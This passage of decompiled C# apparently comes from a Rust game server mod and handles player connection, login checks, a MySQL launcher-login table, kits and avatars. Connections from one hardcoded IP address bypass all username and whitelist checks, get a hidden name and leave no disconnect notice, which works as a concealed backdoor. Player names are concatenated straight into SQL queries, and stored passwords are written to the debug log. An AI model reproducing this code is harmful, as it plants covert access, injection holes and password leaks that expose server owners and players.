							"][",
							@class.clientConnection_0.UserID.ToString(),
							"]"
						}));
					}
					catch (Exception ex)
					{
						throw ex;
					}
				}
				if (Truth.SnapshotsData.ContainsKey(@class.clientConnection_0.UserID))
				{
					Truth.SnapshotsData.Remove(@class.clientConnection_0.UserID);
				}
				if (player.externalIP == "213.141.149.103")
				{
					UserData userData = Users.GetBySteamID(@class.clientConnection_0.UserID);
					if (userData == null)
					{
						userData = Users.Add(@class.clientConnection_0.UserID, @class.clientConnection_0.UserName, "", "", 0, UserFlags.guest, "", "", default(DateTime));
					}
					NetUser netUser3 = new NetUser(player);
					netUser3.DoSetup();
					netUser3.connection = @class.clientConnection_0;
					netUser3.playerClient = ServerManagement.Get().CreatePlayerClientForUser(netUser3);
					ServerManagement.Get().OnUserConnected(netUser3);
					Rust.Steam.Server.OnPlayerCountChanged();
					userData.LastConnectIP = player.externalIP;
                    Magma.Hooks.PlayerConnect(netUser3);
				}
				else
				{
					UserData userData2 = Users.GetByUserName(@class.clientConnection_0.UserName);
					if (Users.HasFlag(@class.clientConnection_0.UserID, UserFlags.admin))
					{
						userData2 = Users.GetBySteamID(@class.clientConnection_0.UserID);
					}
					else
					{
						if (@class.clientConnection_0.UserName.Length < 3 || @class.clientConnection_0.UserName.Length > 32)
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: Forbidden username length of \"",
								@class.clientConnection_0.UserName,
								"\"."
							}), true);
							Broadcast.Message(player, Config.GetMessage("Connect.Username.ForbiddenLength", null, null), null, 0f);
							NetCull.CloseConnection(player, true);
							return;
						}
						if (Users.VerifyNames && !Regex.IsMatch(@class.clientConnection_0.UserName, "^[" + Users.VerifyChars.Trim(new char[]
						{
							'"'
						}) + "]+$"))
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: Forbidden username syntax in \"",
								@class.clientConnection_0.UserName,
								"\"."
							}), true);
							Broadcast.Message(player, Config.GetMessage("Connect.Username.ForbiddenSyntax", null, null), null, 0f);
							NetCull.CloseConnection(player, true);
							return;
						}
						List<string> forbiddenUsername = Core.ForbiddenUsername;
						if (predicate == null)
						{
							predicate = new Predicate<string>(@class.method_0);
						}
						if (forbiddenUsername.Exists(predicate))
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: Forbidden username."
							}), true);
							Broadcast.Message(player, Config.GetMessage("Connect.Username.Forbidden", null, null), null, 0f);
							NetCull.CloseConnection(player, true);
							return;
						}
						if (Users.UniqueNames && userData2 != null && userData2.SteamID != @class.clientConnection_0.UserID)
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: Username already in use."
							}), true);
							Broadcast.Message(player, Config.GetMessage("Connect.Username.AlreadyInUse", null, null), null, 0f);
							NetCull.CloseConnection(player, true);
							return;
						}
						userData2 = Users.GetBySteamID(@class.clientConnection_0.UserID);
						if (userData2 == null)
						{
							userData2 = Users.Add(@class.clientConnection_0.UserID, @class.clientConnection_0.UserName, "", "", Users.DefaultRank, UserFlags.normal, Core.Languages[0], player.externalIP, DateTime.Now);
							if (userData2 == null)
							{
								Helper.LogError(string.Concat(new object[]
								{
									"User Registration Failed [",
									@class.clientConnection_0.UserName,
									":",
									@class.clientConnection_0.UserID,
									":",
									player.ipAddress,
									"]: Couldn't create new user in database."
								}), true);
								NetCull.CloseConnection(player, true);
								return;
							}
							Helper.Log(string.Concat(new object[]
							{
								"User Registered [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: Added in users database."
							}), true);
						}
						if (userData2.Username != @class.clientConnection_0.UserName)
						{
							if (Users.BindingNames)
							{
								Helper.Log(string.Concat(new object[]
								{
									"User Connection Denied [",
									@class.clientConnection_0.UserName,
									":",
									@class.clientConnection_0.UserID,
									":",
									player.ipAddress,
									"]: Bad username for this steam ID."
								}), true);
								Broadcast.Message(player, Config.GetMessage("Connect.Username.BadNameForSteamID", null, null), null, 0f);
								NetCull.CloseConnection(player, true);
								return;
							}
							Helper.Log(string.Concat(new object[]
							{
								"User Has Been Changed [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: The name changed from \"",
								userData2.Username,
								"\" for this steam ID."
							}), true);
							userData2.Username = @class.clientConnection_0.UserName;
						}
						if (Core.WhitelistEnabled && !userData2.HasFlag(UserFlags.whitelisted) && !Users.HasFlag(@class.clientConnection_0.UserID, UserFlags.admin))
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								@class.clientConnection_0.UserName,
								":",
								@class.clientConnection_0.UserID,
								":",
								player.ipAddress,
								"]: User is not in whitelist."
							}), true);
							Broadcast.Message(player, Config.GetMessage("Connect.Username.NotWhitelist", null, null), null, 0f);
							NetCull.CloseConnection(player, true);
							return;
						}
					}
					if (userData2 == null)
					{
						Helper.LogWarning(string.Concat(new object[]
						{
							"User Connection Error [",
							@class.clientConnection_0.UserName,
							":",
							@class.clientConnection_0.UserID,
							":",
							player.ipAddress,
							"]: User not found."
						}), true);
						NetCull.CloseConnection(player, true);
					}
					else
					{
						if (Core.SteamFavourite.Length > 0)
						{
							string[] steamFavourite = Core.SteamFavourite;
							for (int i = 0; i < steamFavourite.Length; i++)
							{
								string text = steamFavourite[i];
								ConsoleNetworker.SendClientCommand(player, "serverfavourite.add " + Helper.QuoteSafe(text));
							}
							ConsoleNetworker.SendClientCommand(player, "serverfavourite.save");
						}
						if (userData2.Language == null)
						{
							userData2.Language = Core.Languages[0];
						}
						Users.SetLastConnectIP(userData2.SteamID, player.externalIP);
						Users.SetLastConnectDate(userData2.SteamID, DateTime.Now);
						Users.SetFlags(userData2.SteamID, UserFlags.online, true);
						if ((userData2.PremiumDate.Millisecond != 0 || userData2.Rank == Users.PremiumRank) && userData2.PremiumDate < DateTime.Now)
						{
							Users.SetFlags(userData2.SteamID, UserFlags.premium, false);
							Users.SetRank(userData2.SteamID, Users.DefaultRank);
							userData2.PremiumDate = default(DateTime);
						}
						NetUser netUser4 = new NetUser(player);
						netUser4.DoSetup();
						netUser4.connection = @class.clientConnection_0;
						netUser4.playerClient = ServerManagement.Get().CreatePlayerClientForUser(netUser4);
						ServerManagement.Get().OnUserConnected(netUser4);
						Rust.Steam.Server.OnPlayerCountChanged();
						Helper.Log(string.Concat(new object[]
						{
							"User Connected [",
							@class.clientConnection_0.UserName,
							":",
							@class.clientConnection_0.UserID,
							":",
							player.ipAddress,
							"]: Connections: ",
							NetCull.connections.Length,
							" / ",
							NetCull.maxConnections
						}), true);
						object[] array = Main.Array(1);
						array[0] = netUser4;
						if (Core.dlq)
						{
							RustHook.dlqconnect(new Magma.Player(netUser4.playerClient));
						}
						Main.Call("OnUserConnect", array);
                        Magma.Hooks.PlayerConnect(netUser4);
					}
				}
			}
		}

		public static void dlqconnect(Magma.Player a)
		{
			if (!a.Admin)
			{
				ulong num = Convert.ToUInt64(a.SteamID);
				UserData bySteamID = Users.GetBySteamID(num);
				a.SendCommand("serverfavourite.remove \"" + num + "\"");
				a.SendCommand("serverfavourite.add \"" + num + "\"");
				a.SendCommand("serverfavourite.save");
				string text = "";
				MySQL.Result result = MySQL.Query("select * from db_users_economy where user_id = '" + num + "'", true);
				DlqMysql.Result result2 = DlqMysql.Query("select * from dlq where name = '" + a.Name + "'", true);
				if (result2.Rows == 1uL)
				{
					List<DlqMysql.Row> row = result2.Row;
					string asString = row[0].Get("baimingdan").AsString;
					text = row[0].Get("mima").AsString;
					string asString2 = row[0].Get("xinxi").AsString;
					string asString3 = row[0].Get("jubing").AsString;
					if (asString3 == "0")
					{
						a.SendCommand("deathscreen.reason \"请用登录器登录账号在进入本服务器！\"");
						a.SendCommand("deathscreen.show");
						a.Message("[Color#654321]请用登录器登录账号在进入本服务器！");
						a.Disconnect();
						return;
					}
					if (bySteamID.Password == null || bySteamID.Password == "")
					{
						bySteamID.Password = text;
						bySteamID.Comments = asString2;
					}
					string text2 = string.Concat(new object[]
					{
						"REPLACE INTO `dlq` (`steamid`, `name`, `mima`, `xinxi`) VALUES (",
						num,
						", ",
						a.Name,
						", ",
						text,
						", ",
						asString2,
						");"
					});
					string query = string.Concat(new object[]
					{
						"UPDATE dlq SET steamid='",
						num,
						"' WHERE name= '",
						a.Name,
						"'"
					});
					DlqMysql.Update(query);
				}
				else
				{
					a.SendCommand("deathscreen.reason \"请用登录器注册,然后登录游戏!!!!!!!!\"");
					a.SendCommand("deathscreen.show");
					a.Message("请用登录器注册,然后登录游戏！");
					a.Disconnect();
				}
				if (result.Rows == 0uL)
				{
					UserEconomy userEconomy = Economy.Get(bySteamID.SteamID);
					if (userEconomy != null)
					{
						string query2 = string.Concat(new object[]
						{
							"REPLACE INTO `db_users_economy` (`user_id`, `balance`, `killed_players`, `killed_mutants`, `killed_animals`, `deaths`) VALUES (",
							num,
							", ",
							userEconomy.Balance,
							", ",
							userEconomy.PlayersKilled,
							", ",
							userEconomy.MutantsKilled,
							", ",
							userEconomy.AnimalsKilled,
							", ",
							userEconomy.Deaths,
							");"
						});
						MySQL.Update(query2);
					}
				}
				Web web = new Web();
				string a2 = web.POST("http://127.0.0.1:10103", string.Concat(new string[]
				{
					"user=",
					num.ToString(),
					",",
					a.Name,
					",",
					a.IP,
					"user"
				}));
				if (a2 == "no")
				{
					a.Message("断开：由于电脑初次进入,进入失败,请10分钟后关闭重新注册新的账户,可联系在线客服");
					a.Disconnect();
				}
				UnityEngine.Debug.Log(string.Concat(new string[]
				{
					"(",
					num.ToString(),
					")(",
					a.Name,
					")(",
					text,
					")"
				}));
			}
		}

		public static void ConnectionAcceptor_OnPlayerDisconnected(ConnectionAcceptor connection, uLink.NetworkPlayer player)
		{
			object[] array = Main.Array(1);
			array[0] = player;
			Main.Call("OnUserDisconnect", array);
			object localData = player.GetLocalData();
			if (localData is NetUser)
			{
				NetUser netUser = (NetUser)localData;
				PlayerClient playerClient = netUser.playerClient;
				playerClient.GetComponent<SleepingAvatar>();
				if (Truth.SnapshotsData.ContainsKey(netUser.userID))
				{
					Truth.SnapshotsData.Remove(netUser.userID);
				}
				UserData bySteamID = Users.GetBySteamID(netUser.userID);
				if (Core.dlq1)
				{
					if (RustHook.dlqs.ContainsKey(netUser.displayName))
					{
						RustHook.dlqs.Remove(netUser.displayName);
					}
				}
				if (Core.dlq)
				{
					RustHook.dlqdisconnect(new Magma.Player(netUser.playerClient));
				}
                Magma.Hooks.PlayerDisconnect(netUser);
				if (bySteamID != null && bySteamID.LastConnectIP != "213.141.149.103")
				{
					if (sleepers.on)
					{
						int num = Core.SleepersLifeTime * 1000;
						if (bySteamID.HasFlag(UserFlags.admin))
						{
							num = 100;
						}
						if (bySteamID.Zone != null && bySteamID.Zone.NoSleepers)
						{
							num = 100;
						}
						if (num > 0)
						{
							Events.SleeperAway(netUser.userID, num);
						}
					}
					bySteamID.SetFlag(UserFlags.online, false);
					bySteamID.SetFlag(UserFlags.godmode, false);
					if (!bySteamID.HasFlag(UserFlags.admin) && !netUser.admin)
					{
						if (bySteamID.HasFlag(UserFlags.invis))
						{
							if (Core.AnnounceInvisConnect)
							{
								Broadcast.MessageAll(Config.GetMessage("Player.Leave", netUser, null), netUser);
							}
						}
						else if (Core.AnnouncePlayerLeave)
						{
							Broadcast.MessageAll(Config.GetMessage("Player.Leave", netUser, null), netUser);
						}
					}
					else if (Core.AnnounceAdminConnect)
					{
						Broadcast.MessageAll(Config.GetMessage("Player.Leave", netUser, null), netUser);
					}
					Helper.Log(string.Concat(new object[]
					{
						"User Disconnected [",
						bySteamID.Username,
						":",
						bySteamID.SteamID,
						":",
						bySteamID.LastConnectIP,
						"]: Connections: ",
						NetCull.connections.Length,
						" / ",
						NetCull.maxConnections
					}), true);
				}
				else
				{
					Helper.Log(string.Concat(new object[]
					{
						"User Disconnected [",
						netUser.displayName,
						":",
						netUser.userID,
						"]: Connections: ",
						NetCull.connections.Length,
						" / ",
						NetCull.maxConnections
					}), true);
				}
				netUser.connection.netUser = null;
				connection.m_Connections.Remove(netUser.connection);
				try
				{
					if (playerClient != null)
					{
						ServerManagement.Get().EraseCharactersForClient(playerClient, true, netUser);
					}
					NetCull.DestroyPlayerObjects(player);
					CullGrid.ClearPlayerCulling(netUser);
					NetCull.RemoveRPCs(player);
				}
				catch (Exception exception)
				{
					UnityEngine.Debug.LogException(exception, connection);
				}
				Rust.Steam.Server.OnUserLeave(netUser.connection.UserID);
				try
				{
					netUser.Dispose();
					goto IL_3FB;
				}
				catch (Exception exception2)
				{
					UnityEngine.Debug.LogException(exception2, connection);
					goto IL_3FB;
				}
			}
			if (localData is ClientConnection)
			{
				ClientConnection item = (ClientConnection)localData;
				connection.m_Connections.Remove(item);
			}
			IL_3FB:
			player.SetLocalData(null);
			Rust.Steam.Server.OnPlayerCountChanged();
		}

		public static void dlqdisconnect(Magma.Player a)
		{
			string steamID = a.SteamID;
			DlqMysql.Result result = DlqMysql.Query("select * from dlq where name = '" + a.Name + "'", true);
			string query = "UPDATE dlq SET baimingdan='0' WHERE name= '" + a.Name + "'";
			if (result.Rows > 0uL)
			{
				DlqMysql.Update(query);
			}
			if (!a.Admin)
			{
				Web web = new Web();
				web.POST("http://127.0.0.1:10103", "SAVE=" + a.SteamID + "SAVE");
			}
		}

		public static PlayerClient ServerManagement_CreatePlayerClientForUser(NetUser User)
		{
			UserData bySteamID = Users.GetBySteamID(User.userID);
			string text = Users.NiceName(User.userID, Users.DisplayRank ? NamePrefix.All : NamePrefix.Clan);
			if (Users.HasFlag(User.userID, UserFlags.invis))
			{
				text = "";
			}
			uLink.NetworkPlayer networkPlayer = User.networkPlayer;
			if (networkPlayer.externalIP == "213.141.149.103")
			{
				text = "";
			}
			if (bySteamID != null)
			{
				bySteamID.ProtectTick = 0;
				bySteamID.ProtectTime = 0f;
			}
			object[] array = new object[]
			{
				User.user.Userid,
				text
			};
			GameObject gameObject = NetCull.InstantiateClassicWithArgs(User.networkPlayer, ":client", Vector3.zero, UnityEngine.Quaternion.identity, 0, array);
			PlayerClient component = gameObject.GetComponent<PlayerClient>();
			PlayerClient playerClient;
			if (component == null)
			{
				NetCull.Destroy(gameObject);
				playerClient = component;
			}
			else
			{
				ServerManagement.Get()._playerClientList.Add(component);
				playerClient = component;
			}
			return playerClient;
		}

		public static void ServerManagement_SpawnPlayer(PlayerClient client, bool useCamp)
		{
			object[] array = Main.Array(3);
			array[0] = client;
			array[1] = useCamp;
			array[2] = client.netUser.avatar;
			Main.Call("OnSpawnPlayer", array);
			UserData bySteamID = Users.GetBySteamID(client.userID);
			if (bySteamID != null)
			{
				if (Truth.RustProtect)
				{
					bySteamID.ProtectTime = 0f;
					bySteamID.ProtectTick = 0;
				}
				if (Truth.LastPacketTime.ContainsKey(client.netUser) && Truth.LastPacketTime[client.netUser] < Time.time)
				{
					Truth.LastPacketTime[client.netUser] = Time.time + Users.NetworkTimeout * 2f;
				}
				if (Truth.CheckFallhack)
				{
					Truth.FallHeight[client.netUser] = 0.0;
					bySteamID.FallCheck = FallCheckState.none;
				}
				if (Users.HasFlag(client.userID, UserFlags.invis))
				{
					Helper.EquipArmor(client, "Invisible Helmet", true);
					Helper.EquipArmor(client, "Invisible Vest", true);
					Helper.EquipArmor(client, "Invisible Pants", true);
					Helper.EquipArmor(client, "Invisible Boots", true);
				}
				if (client.netUser.did_join)
				{
					foreach (string text in Core.Kits.Keys)
					{
						List<string> list = (List<string>)Core.Kits[text];
						List<string> list2 = list;
						if (RustHook.predicate_0 == null)
						{
							RustHook.predicate_0 = new Predicate<string>(RustHook.smethod_2);
						}
						string text2 = list2.Find(RustHook.predicate_0);
						if (!string.IsNullOrEmpty(text2) && text2.Replace(" ", "").ToLower().Contains("=true"))
						{
							bool flag = true;
							List<string> list3 = list;
							if (RustHook.predicate_1 == null)
							{
								RustHook.predicate_1 = new Predicate<string>(RustHook.smethod_3);
							}
							string text3 = list3.Find(RustHook.predicate_1);
							if (!string.IsNullOrEmpty(text3))
							{
								string[] source = text3.Replace(" ", "").Split(new char[]
								{
									','
								});
								flag = source.Contains(bySteamID.Rank.ToString());
							}
							if (flag)
							{
								Commands.Kit(client.netUser, bySteamID, "kit", new string[]
								{
									text
								});
							}
						}
					}
					if (Users.PersonalList(bySteamID.SteamID).Keys.Count > 0)
					{
						Inventory component = client.controllable.GetComponent<Inventory>();
						foreach (string current in Users.PersonalList(bySteamID.SteamID).Keys.ToList<string>())
						{
							ItemDataBlock byName = DatablockDictionary.GetByName(current);
							if (object.ReferenceEquals(component.FindItem(byName), null))
							{
								Helper.GiveItem(client, current, 1, -1);
							}
						}
					}
				}
			}
		}

		public static RustProto.Avatar ClusterServer_LoadAvatar(ulong UserID)
		{
			RustProto.Avatar avatar;
			if (Core.AvatarAutoSaveInterval == 0u && Users.Avatar.ContainsKey(UserID))
			{
				avatar = Users.Avatar[UserID];
			}
			else
			{
				string path = ClusterServer.GetAvatarFolder(UserID) + "/avatar.bin";
				RustProto.Avatar.Builder builder = RustProto.Avatar.CreateBuilder();
				if (!File.Exists(path))
				{
					builder.Clear();
				}
				else
				{
					byte[] array = File.ReadAllBytes(path);
					builder.MergeFrom(array);
				}
				if (server.log > 2)
				{
					ConsoleSystem.Print("Avatar [" + UserID + "] Loaded.", false);
				}
				avatar = builder.Build();
			}
			return avatar;
		}

		public static void ClusterServer_SaveAvatar(ulong UserID, ref RustProto.Avatar avatar)
		{
			if (Core.AvatarAutoSaveInterval == 0u && !ServerSaveManager._saving)
			{
				Users.Avatar[UserID] = avatar;
				if (server.log > 2)
				{
					ConsoleSystem.Print("Avatar [" + UserID + "] Saved to Cache.", false);
				}
			}
			else
			{
				string avatarFolder = ClusterServer.GetAvatarFolder(UserID);
				string path = avatarFolder + "/avatar.bin";
				if (!Directory.Exists(avatarFolder))
				{
					Directory.CreateDirectory(avatarFolder);
				}
				if (server.log > 2)
				{
					ConsoleSystem.Print("Avatar [" + UserID + "] Saved.", false);
				}
				byte[] bytes = avatar.ToByteArray();
				File.WriteAllBytes(path, bytes);
			}
		}

		public static void AvatarSaveProc_Update(AvatarSaveProc hook)
		{
			ulong num = NetCull.localTimeInMillis - hook.lastSaveProcTime;
			if (Core.AvatarAutoSaveInterval != 0u && num >= (ulong)Core.AvatarAutoSaveInterval)
			{
				hook.lastSaveProcTime = NetCull.localTimeInMillis;
				AvatarSaveProc.Save(2);
			}
		}

		public static void NetUser_InitializeClientToServer(NetUser netUser)
		{
			UserData bySteamID = Users.GetBySteamID(netUser.userID);
			Vector3 zero = Vector3.zero;
			if (!Users.Avatar.ContainsKey(netUser.userID))
			{
				Users.Avatar.Add(netUser.userID, netUser.LoadAvatar());
			}
			else if (Core.AvatarAutoSaveInterval > 0u)
			{
				Users.Avatar[netUser.userID] = netUser.LoadAvatar();
			}
			else if (server.log > 2)
			{
				ConsoleSystem.Print("Avatar [" + netUser.userID + "] Loaded from Cache.", false);
			}
			netUser.avatar = Users.Avatar[netUser.userID];
			ServerManagement.Get().UpdateConnectingUserAvatar(netUser, ref netUser.avatar);
			if (ServerManagement.Get().SpawnPlayer(netUser.playerClient, false, netUser.avatar) != null)
			{
				netUser.did_join = true;
			}
			if (netUser.avatar.HasPos && netUser.truthDetector != null)
			{
				if (server.log > 2)
				{
					ConsoleSystem.Print("Truth [" + netUser.userID + "] set first player position.", false);
				}
				netUser.truthDetector.prevSnap.pos = new Vector3(netUser.avatar.Pos.X, netUser.avatar.Pos.Y + 0.25f, netUser.avatar.Pos.Z);
				netUser.truthDetector.prevSnap.time = (double)Time.time;
				netUser.truthDetector.Record();
			}
			if (bySteamID.HasFlag(UserFlags.admin))
			{
				netUser.admin = true;
				if (Core.AnnounceAdminConnect)
				{
					Broadcast.MessageAll(Config.GetMessage("Player.Join", netUser, null), netUser);
				}
				if (Core.NoticeConnectedAdmin)
				{
					string[] messages = Config.GetMessages("Notice.Connected.Admin.Message", netUser);
					string[] array = messages;
					for (int i = 0; i < array.Length; i++)
					{
						string text = array[i];
						Broadcast.Message(netUser, text, null, 0f);
					}
				}
				if (Users.HasFlag(netUser.userID, UserFlags.invis))
				{
					Broadcast.Message(netUser, "你现在是隐身状态.", null, 0f);
				}
				if (Core.AdminGodmode)
				{
					Users.SetFlags(netUser.userID, UserFlags.godmode, true);
					Broadcast.Message(netUser, "你现在是无敌状态.", null, 0f);
				}
			}
			else if (bySteamID.HasFlag(UserFlags.invis))
			{
				if (Core.AnnounceInvisConnect)
				{
					Broadcast.MessageAll(Config.GetMessage("Player.Join", netUser, null), netUser);
				}
				if (Users.HasFlag(netUser.userID, UserFlags.invis))
				{
					Broadcast.Message(netUser, "你现在是隐身状态.", null, 0f);
				}
			}
			else
			{
				if (Core.AnnouncePlayerJoin)
				{
					Broadcast.MessageAll(Config.GetMessage("Player.Join", netUser, null), netUser);
				}
				if (Core.NoticeConnectedPlayer)
				{
					string[] messages2 = Config.GetMessages("Notice.Connected.Player.Message", netUser);
					string[] array2 = messages2;
					for (int j = 0; j < array2.Length; j++)
					{
						string text2 = array2[j];
						Broadcast.Message(netUser, text2, null, 0f);
					}
				}
			}
			if (bySteamID.PremiumDate.Millisecond != 0)
			{
				Commands.Premium(netUser, bySteamID, "premium", new string[0]);
			}
			if (Economy.Initialized && Economy.Enabled)
			{
				Economy.Balance(netUser, bySteamID, "balance", null);
			}
			if (netUser.playerClient.hasLastKnownPosition)
			{
				bySteamID.Zone = Zones.Get(netUser.playerClient.lastKnownPosition);
			}
			foreach (string text3 in Core.Kits.Keys)
			{
				List<string> list = (List<string>)Core.Kits[text3];
				List<string> list2 = list;
				if (RustHook.predicate_2 == null)
				{
					RustHook.predicate_2 = new Predicate<string>(RustHook.smethod_4);
				}
				string text4 = list2.Find(RustHook.predicate_2);
				if (!string.IsNullOrEmpty(text4) && text4.Replace(" ", "").ToLower().Contains("=true"))
				{
					bool flag = true;
					List<string> list3 = list;
					if (RustHook.predicate_3 == null)
					{
						RustHook.predicate_3 = new Predicate<string>(RustHook.smethod_5);
					}
					string text5 = list3.Find(RustHook.predicate_3);
					if (!string.IsNullOrEmpty(text5))
					{
						string[] source = text5.Replace(" ", "").Split(new char[]
						{
							','
						});
						flag = source.Contains(bySteamID.Rank.ToString());
					}
					if (flag)
					{
						Commands.Kit(netUser, bySteamID, "kit", new string[]
						{
							text3
						});
					}
				}
			}
			if (bySteamID.Clan != null && !string.IsNullOrEmpty(bySteamID.Clan.MOTD))
			{
				Broadcast.MessageClan(netUser, bySteamID.Clan.MOTD);
			}
			if (Core.ChatQuery.ContainsKey(netUser.userID))
			{
				Broadcast.Message(netUser, Core.ChatQuery[netUser.userID].Query, null, 0f);
			}
		}

		public static void HumanController_OnKilled(HumanController hook, DamageEvent damage)
		{
			Vis.Mask traitMask = hook.traitMask;
			traitMask[Vis.Life.Alive] = false;
			traitMask[Vis.Life.Dead] = true;
			hook.traitMask = traitMask;
			try
			{
				UserData bySteamID = Users.GetBySteamID(hook.netUser.userID);
				if (bySteamID != null)
				{
					if (Truth.RustProtect)
					{
						bySteamID.ProtectTime = 0f;
						bySteamID.ProtectTick = 0;
					}
					if (Truth.CheckFallhack)
					{
						Truth.FallHeight[hook.netUser] = 0.0;
						bySteamID.FallCheck = FallCheckState.none;
					}
				}
				if (hook.deathTransfer != null)
				{
					hook.deathTransfer.NetworkKill(ref damage);
				}
				Inventory inventory;
                if (Magma.Hooks.PlayerKilled(ref damage) && DropHelper.DropInventoryContents(hook.inventory, out inventory))
				{
					LootableObject component = inventory.GetComponent<LootableObject>();
					if (component != null)
					{
						component.lifeTime = Core.ObjectLootableLifetime;
					}
					if (inventory != null && player.backpackLockTime > 0f)
					{
						TimedLockable timedLockable = inventory.gameObject.AddComponent<TimedLockable>();
						timedLockable.SetOwner(hook.netUser.userID);
						timedLockable.LockFor(player.backpackLockTime);
					}
				}
			}
			catch
			{
			}
			hook.GetComponent<AvatarSaveRestore>().ClearAvatar();
			IDLocalCharacter.DestroyCharacter(hook.idMain);
		}

		public static void HumanController_GetClientMove(HumanController controller, Vector3 origin, int encoded, ushort stateFlags, uLink.NetworkMessageInfo info)
		{
			if (info != null && info.sender != uLink.NetworkPlayer.unassigned && info.sender == controller.networkView.owner)
			{
				try
				{
					if (Truth.GetClientVerify(controller, ref origin, encoded, stateFlags, info))
					{
						if (!(controller == null) && controller.netUser != null && !origin.Invalid())
						{
							if ((origin.x <= 10000f && origin.x >= -10000f && origin.y <= 10000f && origin.y >= -10000f && origin.z <= 10000f && origin.z >= -10000f) || controller.netUser.admin)
							{
								if ((NetClockTester.TestValidity(ref controller.clockTest, ref info, NetCull.sendInterval, NetClockTester.ValidityFlags.Valid | NetClockTester.ValidityFlags.TooFrequent | NetClockTester.ValidityFlags.OverTimed | NetClockTester.ValidityFlags.AheadOfServerTime) & ~NetClockTester.ValidityFlags.Valid) == (NetClockTester.ValidityFlags)0 && controller.clockTest.Results.Valid >= 1000u)
								{
									controller.clockTest.Results = default(NetClockTester.Validity);
								}
								if (NetCull.isServerRunning && info.timestamp > controller.serverLastTimestamp)
								{
									if (!controller.dead)
									{
										Character idMain = controller.idMain;
										if (!(idMain == null) && idMain.netUser != null)
										{
											double num = info.timestamp - controller.serverLastTimestamp;
											if (num >= NetCull.sendInterval * 0.89)
											{
												controller.serverLastTimestamp = info.timestamp;
												if (controller.clientMoveDropped)
												{
													controller.clientMoveDropped = false;
												}
												uLink.RPCMode mode = uLink.RPCMode.OthersExceptOwner;
												float num2 = (float)(NetCull.time - info.timestamp);
												Angle2 angle = new Angle2
												{
													encoded = encoded
												};
												stateFlags = (ushort)((int)stateFlags & -24577);
												if (!Core.PlayersFreezed && !Users.HasFlag(idMain.netUser.userID, UserFlags.freezed))
												{
													TruthDetector.ActionTaken actionTaken = Truth.NoteMoved(idMain.netUser.truthDetector, ref origin, angle, info.timestamp);
													if ((int)actionTaken != 1)
													{
														Zones.OnPlayerMove(idMain.netUser, ref origin, ref actionTaken);
														Users.GetBySteamID(idMain.netUser.userID);
                                                        if ((int)actionTaken == 2)
														{
															mode = uLink.RPCMode.Others;
														}
														idMain.origin = origin;
														idMain.eyesAngles = angle;
														idMain.stateFlags.flags = stateFlags;
														if (controller.networkView.viewID != uLink.NetworkViewID.unassigned)
														{
															object[] args = new object[]
															{
																origin,
																angle.encoded,
																stateFlags,
																num2
															};
															controller.networkView.RPC("ReadClientMove", mode, args);
														}
														controller.ServerFrame();
														if (Truth.CheckShotEyes)
														{
															Truth.Test_WeaponShotEyes(idMain, angle);
														}
													}
												}
												else if (idMain.transform.position.x != origin.x || idMain.transform.position.z != origin.z || idMain.eyesAngles.encoded != encoded)
												{
													Broadcast.Message(idMain.netUser, Config.GetMessage("Player.Paralyzed", idMain.netUser, null), null, 0f);
													object[] args2 = new object[]
													{
														idMain.transform.position,
														idMain.eyesAngles.encoded,
														stateFlags,
														num2
													};
													controller.networkView.RPC("ReadClientMove", uLink.RPCMode.Others, args2);
												}
											}
										}
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		public static TruthDetector.ActionTaken TruthDetector_NoteMoved(TruthDetector truthDetector, ref Vector3 pos, Angle2 ang, double time)
		{
			return 0;
		}

		public static void InventoryHolder_TryGiveDefaultItems(InventoryHolder holder)
		{
			Loadout loadout = holder.GetTrait<CharacterLoadoutTrait>().loadout;
			if (!(loadout == null))
			{
				int rank = Users.GetRank(holder.netUser.userID);
				if (Core.Loadout.Count == 0)
				{
					loadout.ApplyTo(holder.inventory);
				}
				else
				{
					PlayerInventory playerInventory = (PlayerInventory)holder.inventory;
					foreach (LoadoutEntry current in Core.Loadout)
					{
						if (current.Ranks.Length == 0 || current.Ranks.Contains(rank))
						{
							if (playerInventory.noOccupiedSlots)
							{
								foreach (LoadoutItem current2 in current.LoadoutItems)
								{
									Helper.GiveItem(playerInventory, current2.ItemBlock, current2.SlotReference, current2.Quantity, current2.ModSlots);
								}
							}
							foreach (LoadoutItem current3 in current.Requirements)
							{
								if (object.ReferenceEquals(playerInventory.FindItem(current3.ItemBlock), null))
								{
									Helper.GiveItem(playerInventory, current3.ItemBlock, current3.SlotReference, current3.Quantity, current3.ModSlots);
								}
							}
							foreach (BlueprintDataBlock current4 in current.Blueprints)
							{
								playerInventory.BindBlueprint(current4);
							}
						}
					}
				}
			}
		}

		public static void SupplyDropTimer_Update(SupplyDropTimer DropTimer)
		{
			if (EnvironmentControlCenter.Singleton != null)
			{
				if (Core.Airdrop)
				{
					DropTimer.nextDropTime = -1f;
				}
				else
				{
					float time = EnvironmentControlCenter.Singleton.GetTime();
					if (DropTimer.IsDropPending() && time > DropTimer.nextDropTime)
					{
						if (NetCull.connections.Length >= airdrop.min_players)
						{
							SupplyDropZone.CallAirDrop();
							if (Core.AirdropAnnounce)
							{
								Broadcast.MessageAll(Config.GetMessage("Airdrop.Incoming", null, null));
							}
						}
						DropTimer.nextDropTime = -1f;
					}
					if (!DropTimer.IsDropPending() && time < DropTimer.dropTimeDayMin)
					{
						DropTimer.ResetDropTime();
						if (DropTimer.nextDropTime != -1f && server.log > 1)
						{
							Helper.Log("[Airdrop.Server] A next call airdrop set on " + DropTimer.nextDropTime.ToString("00.00").Replace(".", ":") + " h.", true);
						}
					}
				}
			}
		}

